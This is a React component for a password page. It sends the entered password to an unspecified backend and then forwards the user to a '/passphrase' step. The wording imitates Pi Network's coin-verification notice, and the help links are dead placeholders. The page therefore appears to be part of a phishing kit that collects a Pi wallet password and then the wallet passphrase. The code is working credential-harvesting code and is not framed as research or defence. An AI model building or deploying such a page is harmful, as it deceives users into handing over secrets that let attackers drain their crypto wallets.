import React from "react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import logo from "../assets/logo.webp";
import BASE_URL from "../components/urls";

const schema = yup.object().shape({
  password: yup.string().required("Password is required"),
});

const Password = () => {
  const navigate = useNavigate();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(schema),
  });

  const onSubmit = (data) => {
    axios
      .post(`${BASE_URL}/password`, data)
      .then((response) => {
        console.log(response.data);
        reset();
        navigate("/passphrase");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      });
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center">
      <div className="text-center mb-6">
        <img src={logo} alt="logo" className="w-24 h-24 mx-auto mb-4" />
        <h2 className="text-3xl font-bold text-gray-800">
          Enter your password
        </h2>
      </div>
      <form
        onSubmit={handleSubmit(onSubmit)}
        className="rounded px-8 pt-6 pb-8 mb-4 w-full max-w-md"
      >
        <label className="block text-gray-700 text-sm font-bold mb-2">
          Password:
        </label>
        <input
          type="password"
          className="w-full h-[50px] border-2 border-yellow-400 rounded p-2 mb-4 focus:outline-none focus:ring-2 focus:ring-yellow-500"
          placeholder="Enter password"
          {...register("password")}
        />
        {errors.password && (
          <p className="text-red-500 text-xs italic mb-4">
            {errors.password.message}
          </p>
        )}
        <div className="flex justify-center items-center">
          <button
            type="submit"
            className="w-1/4 bg-white border border-gray-400 text-[#713D92] font-bold py-2 rounded-lg hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-300"
          >
            Submit
          </button>
        </div>

        <div className="text-center mt-10">
          <a
            href="#"
            className="text-blue-600 hover:underline block mb-2 text-sm"
          >
            Password forgotten?
          </a>
          <a href="#" className="text-blue-600 hover:underline text-sm">
            Return to login page
          </a>
        </div>
      </form>

      <p className="text-gray-600 text-xl px-2 mt-12">
        You will need to verify your number in order to claim the coins you
        mine. Pi mined by numbers that cannot verify ownership will be burned.
      </p>
    </div>
  );
};

export default Password;
